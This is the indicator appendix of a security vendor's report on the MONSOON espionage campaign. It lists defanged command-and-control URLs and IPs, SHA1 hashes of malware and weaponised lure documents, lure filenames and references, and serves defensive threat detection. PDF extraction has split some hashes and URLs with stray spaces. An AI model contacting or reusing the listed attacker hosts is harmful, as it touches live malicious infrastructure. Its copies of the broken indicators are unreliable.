\nhxxp://nudtcn.com  \nhxxp://modgovcn.com  \nhxxp://climaxcn.com  \nhxxp://chinastrats.com  \nhxxp://chinastrat.com  \nhxxp://epg -cn.com \nhxxp://extremebolt.co m \nhxxp://socialfreakzz.com  \nhxxp://info81.com  \nhxxp://www.81 -cn.net \nhxxp://lujunxinxi.com  \nhxxp://letsgetclose.com  \nhxxp://greatdexter.com  \nWEAPONISED  DOCUMENT  HASHES  (SHA1)  \n9034c8bfac8385a29f979b1601896c6edb0113b2  (Cyber_Crime_bill.doc)  \n11064dcef86ac1d94c170b2 4215854efb8aad542  (Cyber_Crime_bill.doc)  \n5de78801847fe63ce66cf23f3ff3d25a28e2c6fe  (China_Vietnam_Military_Clash.doc)  \n478a41f254bb7b85e8ae5ac53757fc220e3ab91c  (Cyber_Crime_bill.doc)  \n1e39ff194c72c74c893b7fd9f9d0e7205c5da115  (china_report_EN_web_2016_A01.doc)  \nf7d9e0c7714578eb29716c1d2f49ef0defbf112a  (Job_offers.doc)  \n406c74e8eb89fa7b712a535dd38c79c1afd0c6fe  (DPP_INDIA_2016.pps)  \n9cdbb41f83854ea4827c83ad9809ed0210566fbc  (DPP_INDIA_2016.doc)  \n7ee94c8279ee4282041a242985922dedd9b184b4  (maritime_dispute.pps)  \n1ce0ad355 6f5866f309e04084d9a230f9f2ce158  (Clingendael_Report_South_China_Sea.pps)  \n4a575bfe63262d53a765de254f534e830d03f638  \n(PLA_Forthcoming_Revolution_in_Doctrinal_Affairs.pps)  \ncfb33642b702bb4da43aa6842aa657f1ec89b1f6  (China_Security_Report_2016.pps)  \n5d61d614731bee b520f767fcbb5afe151341238a  (militarizationofsouthchinasea_1.pps)  \nf3c9c62869c87fe177a69271b9e7f2b5aabcd66c  (Chinese_Influence_Faces_2.pps)  \ndcccd7a9886e147ecf01718047e1f911323ca8c9  (2016_China_Military_PowerReport.pps)  \nc9dddd6d4858234e1be971c7f66193ea907ac8d 8 (PLA_UAV_DEPLOYMENT.pps)  \n11c05a5f6ca2e683dba31d458777c0b6b8d558aa  \n(7GeopoliticalConsequencetoAnticipateinAsiainEarly2016_1.doc)  \n3eef8e44556e4102a71ea4499d30f57495b9096a  (UN__4_21_2015.doc)  \n4d1ad73a9c61527a8b685006ab60b0a3ffbc51bd  \n(China_plan_to_dominate_ South_China_Sea_and_beyond.doc)  \ne6acbb5f653c5dc8eb324e82591587179b700d0c  \n(China_Response_NKorea_Nuclear_Test13.pps)  \nea3029aef9ab1cda24ccecfbed8f31ec1f28525e  (ChinaUS_11.pps)  \n3f9dc2944269d1160048c5a96e5eec8d14449341  \n(China_two_child_policy_will_underwhelm11 .pps) \n971ea3f1d32bb8bd9657c17b2c1520b5fb9c1d0e  (MilReforms_1.pps)  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  50/57 \n \ne8276f46e335c4f8cd7313da1fd0b7f6ac9d5892  (MilReforms_2.pps)  \n1c9d01d8562509a7f10e355e6d1d9f3d76cd44cd  (CHINA_FEAR_US_3.pps)  \n48c9f91e6829f2dee0a4a2bf5cb1f26daea6c46a  \n(CHINAS_PUZZLING_DEFENSE_A GREEMENT_WITH_AUSTRALIA_12.pps)  \n414e7d0d874cfd42bd4a11a317730e64bc06b794  (Obama_Gift_China_11.pps)  \n74c504886a7166c044f3fe3529745cdcf097a726  (japan_pivot_12.pps)  \n4d0ed3d1c6a3b4dfe3f5a3a8cf2bb2120b617d18  (TaiwanDiplomaticAccess_11.pps)  \na4f0494212314c9e8c32dd 6cfb16030b13965c2c  (australia_fonops_13.pps)  \ne27d3cfc9141f618c5a8c075e7d18af11a012710  (Sino_Pak.pps)  \n824013c9d8b2aab1396c4a50579f8bd4bf80abdb  (prc_nsg.pps)  \na5cf24751acdf4b9ab307d3fda037c164758704c  (Jakobson_US_China_Report.pps)  \n4d1ad73a9c61527a8b685006ab60 b0a3ffbc51bd  (Sino_Russia.doc)  \nBADNEWS  MALWARE  HASHES  (SHA1)  \ndc7a4def1dd5d62b906d19900b19cad4b2bd299d  \nb362d1d91ed93eebb03d240553153f2148209d3a  \n3b2af1a6dbec193a647d97c4bfaf21f562c27258  \nd09ed8c4b5ad43fb4a6d13a96c2cd083b8795692  \nce7b2336e94900ffad5339769219ab 997d55e4a5  \nb657dedfad9039fdd6a5cdb84a6031e7e457dc91  \n7dcd87e79 d08708e540f9f4bda5692a582c67eed  \nAUTOIT  MALWARE  HASHES  (SHA1)  \n32a89a8c1bc77a300a949091199a082acc165f40  \n1c0a47613f36c723f6a0b62f9d085a646c3dd69d  \naf3f8f686b63bc209ef52ef35c7daad268d57921  \n3109a3307bb 06f815bb48cae39d6a940e1f1113b  \n4d287bb8a93ef633a934a85172f1f0da1400abd5  \nbe7fe8585789a6d584e6c3ebc77b506a02cadb54  \n2cb158449a9c56511dfda518afb76686f3ccadfa  \n282af7d58d4cc71e3430ac1af01d86e07c70891c  \n6356ed00198eda3a2997ee4017cf545c42f77ce2  \ndf3016b793b14c8a9b032 a82d46fa67ce12b91c3  \nf16cd0a84c02c9f0697c0d2d28ad199e5763f96f  \n734d4272748aa3c6ae45abd39a406a6f441b1f4a  \n386390afd e44f7c14917591c89a76e007315fc8b  \nTINYTYPHON  MALWARE  HASHES  (SHA1)  \n411387df2145039fc601bf38192b721388cc5141  \nfcf8e5cf1207fdfab9bcb0a4dc45ad188089655 a \n791eae42d 844a3a684271b56601346a26f3d4a33  \nUNKNOWN  LOGGER  MALWARE  HASHES  (SHA1)  \nc691c07191963ca3db28235d0a38060b2b9ea8f2  \n6e85333e5ee05c40bee0457419aa68a007a0e5f5  \nMISCELLANEOUS  SAMPLES  (SHA1)  \n4c70974aa8ce3de87d1c2a42d418d8c1b25904a4  (.NET updater used by AutoIt backdoors)  \n99f07fb2aaa637291476fde6cfd4921c835959d0  (UAC bypass stub) \nBADNEWS  C&C  \nhxxp://43.249.37.173/quantum/ghsnls.php  \nhxxp://5.254.98.68/Tussmal/ghsnls.php  \nhxxp://85.25.79.230/quantum/ghsnls.php  \nhxxp://85.25.79.230/quantum/ghsnls.php  \nhxxp://capta in.chickenkiller.com/quantum/ghsnls.php  \nhxxp://feeds.rapidfeeds.com/61594/  \nhxxp://feeds.rapidfeeds.com/81908/  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  51/57 \n \nhxxp://feeds.rapidfeeds.com/81909/  \nhxxp://raheel.ignorelist.com/quantum/ghsnls.php  \nhxxp://rasheed.crabdance.com/quantum/ghsnls.php  \nhxxp://raw.gith ubusercontent.com/azeemkhan89/sports/master/sports.xml  \nhxxp://updatesoft.zapto.org/Tussmal/ghsnls.php  \nhxxp://updatesys.zapto.org/Tussmal/ghsnls.php  \nhxxp://ussainbolt.mooo.com/Tussmal/ghsnls.php  \nhxxp://ussainbolt1.mooo.com/Tussmal/ghsnls.php  \nhxxp://www.chin ahush.com/2014/12/27/can -common-views-of-chinese-women-be-changed \nhxxp://www.chinasmack.com/2016/digest/woman -discards -her-food-on-shanghai -\nmetro.html  \nhxxp://www.repeatserver.com/Users/sports/news.xml  \nhxxp://www.webrss.com/createfeed.php?feedid=47444  \nhxxp://194.63.142.174/Mussmal/ghsnls.php  \nhxxp://43.249.37.173/yumhong/ghsnls.php  \nhxxp://85.25.79.230/tesla/ghsnls.php  \nhxxp://asatar.ignorelist.com/tesla/ghsnls.php  \nhxxp://blog.chinadaily.com.cn/home.php?mod=space&uid=2392255&do=blog&id=35101  \nhxxp://feeds.rapidf eeds.com/81913/  \nhxxp://forum.china.org.cn/viewthread.php?tid=175850&page=1&extra  \nhxxp://hostmyrss.com/feed/housing_news  \nhxxp://javedtar.chickenkiller.com/tesla/ghsnls.php  \nhxxp://overthemontains.weebly.com/trekking -lovers \nhxxp://russell01.servebeer.com/  \nhxxp://russell02.servehttp.com/  \nhxxp://russell02.servehttp.com/  \nhxxp://russell03.servehttp.com/  \nhxxp://tariqj.crabdance.com/tesla/ghsnls.php  \nhxxp://wgeastchina.steelhome.cn/xml.xml  \nhxxp://whgt.steelhome.cn/xml.xml  \nhxxp://www.chinasmack.com/2016/digest/chinese -tourist-bit-by-snake-in-\nthailand.html  \nhxxp://www.itpub.net/thread -2055123-1-1.html \nhxxp://www.travelhoneymoon.wordpress.com/2016/03/30/tips -to-how-to-feel-happy \nhxxp://www.webrss.com/createfeed.php?feedid=47448  \nhxxp://www.webrss.com/createfeed.php?feedid= 47449 \nhxxp://wxkysteel.steelhome.cn/xml.xml  \nhxxp://wxycgc.steelhome.cn/xml.xml  \nhxxps://raw.githubusercontent.com/azeemkhan89/cartoon/master/cart.xml  \nAUTOIT  C&C  \nhxxp://212.129.13.110  \nhxxp://212.**redacted**  (please contact if required ) \nMETERPRETER  C&C  \nhxxps://45.43.192.172:8443  \nTINYTYPHON  C&C  \nhxxp://212.**redacted**  (please contact if required ) \nNAMES OF LURE & WEAPONISED FILES  \nBelow are the most common filenames used as lures.  The distribution of words was used to \ngenerate the word cloud . \n10_gay_celebs  \n11_Nepalies_Facts  \n13_Five_Year_Plan_2016 -20-1 \n2016_china_military_powerreport  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  52/57 \n \n7GeopoliticalConsequencetoAnticipateinAsiainEarly2016  \nABiggerBolderChinain2016  \nAeropower  \naerospace  \nAliexpress_Randomiser  \nAN_UPDATED_U  \narty_main  \nAssessing_PLA_Organisational_Reforms  \naustralia_fonops  \nbank \nBehind_China's_Gambit_in_Pakistan  \nBeijing_Nanshan_Ski_Village  \nBOC \nbook_china_transition_under_xi_jinping  \nCEF_Chengdu_July_2016  \nCHINA_FEAR_US  \nchinamilreforms  \nchinamilstrength  \nChina_Nuclear_Weapons  \nChina_Pakistan_  \nChina_Pak_Policy  \nChina_plan_to_dominate_South_China_Sea_and_beyond  \nChina_Response_NKorea_Nuclear_Test1  \nchinascyberarmy2015  \nchina_security_report2016  \nChinas_Evolving_Approach_to_Integrated_Strategic_Deterrence  \nChinasMilitaryIntelligenceSystemisChanging  \nChinas_New_Silk_Road_and_US _Japan_Alliance_Geostrategy  \nchina_sperm_study  \nCHINA'S_PUZZLING_DEFENSE_AGREEMENT_WITH_AUSTRALIA  \nChina_two_child_policy_will_underwhelm  \nChinaUS \nChina_Vietnam_Mil_c lash \nchina_vietnam_military_clash  \nChinese_defence_Budget  \nChinese_Influence  \nChinese_Influence_F aces \nchinesemilstrat  \nChristians_in_China_suffer_persecution_2015  \nCIDEX2016  \nclingendael_Report_South_China_Sea  \ncn-lshc-hospital -operations -excellence  \nconfig \nCounter_Strike4  \nCPM_Update_South_China_Sea  \ncppcc \nCSR74_Blackwill_Campbell_Xi_Jinping  \nDefexpo_ebrouch er \ndpp_india_2016  \nelection  \nenggmarvels  \nEx_Documents12  \nexercise_force_18  \nExercise_Force_18_21  \nEXERCISE_FORCE_281  \nFrom_Frontier_To_Frontline_Tanmen_Maritime_Militia  \nfuturedrones  \ngaokaonewreforms  \ngaokaonewschedule  \nGoedecke_IPSP_South_china_sea  \nharbin Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  53/57 \n \nHigh_Ord er_War \nHow_Russia_China_and_Iran_Are_Eroding_American_Influence  \nHow_to_easily_clean_an_infected_computer  \nImplication_China_mil_reforms  \nIndividual_Income_Tax_Return  \nIOR_South_Asia_Subregion  \nISIS_Bet_Part1  \nISIS_bet_part2  \nIs_She_Up_For_Threesome  \nJ-20 \nJakobson _US_China_Report  \nJapan \njapan_and_the_Maritime_Pivot  \njapan_pivot  \njet \njob_offers  \njtopcentrecomn  \njustgiveitatry  \nkorea1 \nlantern \nlatest_on_south_china_sea  \nLimits_of_Law_in_the_South_China_Sea  \nmaritime_dispute  \nMaritime_Disputes_Involving_China  \nmarriage_laws  \nMedical_Ethics  \nmilitarizationofsouthchinasea  \nmilitary_education_reforms  \nMilitaryReforms  \nMilReform  \nMilReforms  \nmissing_missile_mystery_report  \nMS_Office22  \nMyanmar_DPRK_relations  \nnanomedicine  \nnanomedicinecn  \nnetflix \nNew_Arty_Gun  \nNorth_Korea_Nuclear_Test  \nNorth_Korea _Pivot \nnuc \nNuclear_Industry_Summit  \none_belt_one  \nPAK_CHINA_NAVAL_EXERCISEn  \npension \nPLA_Forthcoming_Revolution_in_Doctrinal_Affairs  \nPLA_UAV_DEPLOYMENT  \nPlayboy_Mar16  \nQuantum_leap_into_computing_and_communication  \nRadar \nrail_time_table_2016  \nRamadaan_Offers  \nREEFS_ROCKS_  \nReport_Asia_Program_New_Geopolitics  \nSchedule_of_Events_01  \nshifting_waters_chinas_new_passive_assertiveness_asian_maritime_security  \nSino_Pak  \nSino_Russia  \nsocial_security  \nsouth_china_policy  \nSouth_China_Sea_More_Tension_  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  54/57 \n \nSR57_US_China_Apr2016  \nSR57_US_ China_April16  \nstewardess2  \nStrategic_Standoff  \nsyria_china  \nTaiwan \nTaiwanDiplomaticAccess  \nTax \nTaxupdate  \nthe_chinese_military_overview_and_issues  \nthe_chinese_statecraft  \nThe_PLA_Cultivates_Xuexing_for_the_Wars_of_the_Future  \nThe_US_FON_Program_in_the_South_china _Sea \ntibetculture  \nTk_main \nTop_Five_AF  \ntraffic \nUruguayJan -Jun \nUruguayJul -Dec \nUS_china  \nUS_China_Cyberwar  \nus_srilanka_relations  \nWhy_Does_China_Want_to_Control_the_South_China_Sea  \nWILL_ISIS_INFECT_BANGLADESH  \nY-20zodiac  \n  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  55/57 \n \nABOUT US  \nSpecial Investigations is part  of Forcepoint Security Intelligence, itself an integral part of Forcepoint \nSecurity Labs.  It exists to provide the security insights, technologies, and expertise to allow \ncustomers to focus on their own core  business rather than security.  Special Invest igations is made \nup of talented malware reverse engineers and malware analysts.  They are responsible for \ndelivering high quality output as part of their investigations into botnets, APTs, and other deep \nreverse engineering topics.  \nSpecial Investigations w ork with national and international crime agencies, national CERTs and \ntrusted partners.  The team works closely with other parts of Forcepoint Security Labs, as well as \nother areas of the Forcepoint business. They strive to enable and deliver insight and a deep \nunderstan ding of emerging cyber threats.  They are able to communicate this to a broad set of \nstakeholders including customers, partners and the general public with the objective of offering \ntangible decision advantage.  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  56/57 \n \nFIGURES  \nFigure 1 – Word -Cloud of Lure Document Titles  ................................ ................................ ...............  1 \nFigure 2 – Cyber_Crime_Bill.doc (Excerpt)  ................................ ................................ .......................  6 \nFigure 3 – EXIF info for Cyber_Crime_Bi ll.docx  ................................ ................................ ................  7 \nFigure 4 – Search VT by Author Metadata  ................................ ................................ ........................  7 \nFigure 5 – Lure Document Cover  ................................ ................................ ................................ ...... 8 \nFigure 6 – Lures from 37.58.60.195  ................................ ................................ ................................ .. 8 \nFigure 7 – URLQuery.net  ................................ ................................ ................................ ..................  9 \nFigure 8 – Known Bad Email Lure  ................................ ................................ ................................ .. 10 \nFigure 9 – YMLP Lures  ................................ ................................ ................................ ...................  11 \nFigure 10 – China Strat Screen Shot  ................................ ................................ ..............................  12 \nFigure 11 – Lure Google+ Screen Shot ................................ ................................ ...........................  13 \nFigure 12 – Lure Facebook Screen Shot  ................................ ................................ ........................  14 \nFigure 13 – Lure Twitter Screen Shot  ................................ ................................ .............................  15 \nFigure 14 – Exploited CVEs  ................................ ................................ ................................ ............  16 \nFigure 15 – Binary Blob Dropped to %temp%  ................................ ................................ .................  17 \nFigure 16 – VB Extract of Blob  ................................ ................................ ................................ ........  17 \nFigure 17 – VB Decrypti on of Embedded Files  ................................ ................................ ...............  18 \nFigure 18 – PHP Redirect  ................................ ................................ ................................ ...............  20 \nFigure 19 – Silverlight Profiling  ................................ ................................ ................................ ....... 21 \nFigure 20 – Windows Registry Keys  ................................ ................................ ...............................  22 \nFigure 21 – GitHub Command Channel  ................................ ................................ ..........................  24 \nFigure 22 – Chinasm ack[.com]  Command Channel  ................................ ................................ ....... 24 \nFigure 23 – Forum Command Channel  ................................ ................................ ...........................  25 \nFigure 24 – BADNEWS Command Set  ................................ ................................ ...........................  28 \nFigure 25  - Device Change Listener ................................ ................................ ................................  29 \nFigure 26 – Updater VBScript  ................................ ................................ ................................ .........  30 \nFigure 27 – Upload via PHP Script ................................ ................................ ................................ .. 31 \nFigure 28 – Base64 Response  ................................ ................................ ................................ ........  32 \nFigure 29 – Beautified Powershell  ................................ ................................ ................................ .. 33 \nFigure 30 – Hard Coded IP Address  ................................ ................................ ...............................  34 \nFigure 31 – Encrypted Shellcode  ................................ ................................ ................................ .... 35 \nFigure 32 – Decrypted PE File  ................................ ................................ ................................ ........  36 \nFigure 33 – Unknown Log ger Server Configuration Panel  ................................ ..............................  37 \nFigure 34 – Unknown Logger – Settings Panel  ................................ ................................ ...............  38 \nFigure 35 – Unknown Logger Configuration  ................................ ................................ ....................  41 \nFigure 36 – XOR 0x90 Data  ................................ ................................ ................................ ............  42 \nFigure 37 – Document Crawler  ................................ ................................ ................................ ....... 43 \nFigure 38 – Document Upload to C&C  ................................ ................................ ............................  44 \nFigure 39 – C&C Web Server /http listing ................................ ................................ ........................  44 \nFigure 40 – C&C Web Server /http/upload listing  ................................ ................................ ............  45 \nFigure 41 – C&C Web Server /http/upload/<victim> listing  ................................ ..............................  46 \nFigure 42 – Connection Topology  ................................ ................................ ................................ ... 48 \n Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  57/57 \n \nREFERENCES  \n \n[1]  S. Fagerland, “The Hangover Report,” Bluecoat, 2013 May 2013. [Online]. Available: \nhttps://www.bluecoat.com/security -blog/2013 -05-20/hangover -report. [Accessed May 2016].  \n[2]  S. Fagerland, M. Kråkvik, J. Camp and N. Moran, “ Operation Hangover: Unveiling an Indian \nCyberattack Infrastructure,” Norman AS, May 2013. [Online]. Available: http://enterprise -\nmanage.norman.c.bitbit.net/resources/files/Unveiling_an_Indian_Cyberattack_Infrastructure.pdf. \n[Accessed May 2016].  \n[3]  “Auto IT,” [Online]. Available: https://www.autoitscript.com/site/autoit/. [Accessed June 2016].  \n[4]  “Patchwork – Targeted Attack (APT),” Cymmertia, 7 July 2016. [Online]. Available: \nhttps://www.cymmetria.com/patchwork -targeted -attack/. [Accessed July 2016].  \n[5]  “Microsoft Office Memory Errors Let Remote Users Execute Arbitrary Code and Input Validation \nFlaw Permits Cross -Site Scripting Attacks,” February 2015. [Online]. Available: \nhttps://cve.mitre.org/cgi -bin/cvename.cgi?name=CVE -2015 -1641. [Accessed July 2 016].  \n[6]  “Cyberthreats GitHub: MyDoom Malware Source Code,” [Online]. Available: \nhttps://github.com/cyberthreats/malware -source -mydoom. [Accessed February 2016].  \n[7]  “Leo Davidson & hfiref0x's UAC bypass Method,” March 2015. [Online]. Available: \nhttps ://github.com/hfiref0x/UACME/blob/master/Source/Akagi/pitou.c. [Accessed July 2016].  \n[8]  J.-I. Boutin, “Targeted information stealing attacks in South Asia use email, signed binaries,” \nESET, 16 May 2013. [Online]. Available: http://www.welivesecurity.com/2013/05/16/targeted -\nthreat -pakistan -india/. [Accessed Aug 2016].  \n \n "
}